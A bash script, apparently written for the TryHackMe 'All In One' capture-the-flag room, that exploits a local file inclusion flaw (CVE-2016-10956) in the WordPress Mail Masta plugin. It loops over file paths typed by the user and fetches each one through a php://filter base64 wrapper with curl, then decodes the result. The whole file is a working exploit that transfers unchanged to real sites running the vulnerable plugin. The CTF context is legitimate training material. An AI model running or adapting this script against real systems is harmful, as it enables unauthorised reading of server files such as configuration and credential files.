#!/usr/bin/env bash

# Script for 'All In One' challenge - TryHackMe
# LFI - Local File Inclusion
# CVE-2016-10956
# Author: Pedro Parmentier (HellHound)


_url='http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource='

redColor=$'\e[1;31m'
yellowColor=$'\e[1;33m'
cyanColor=$'\e[1;36m'
nC=$'\e[0m'

function sig_handler() {
    echo -e "\n [i] ${cyanColor} Saliendo... ${nC}"
    exit
}

trap sig_handler SIGINT

while true; do

    file=""
    read -r -p "${cyanColor} > ${nC}" file
    req=$(curl -s --no-keepalive "$_url$file")
    echo "$req" | base64 -d

done
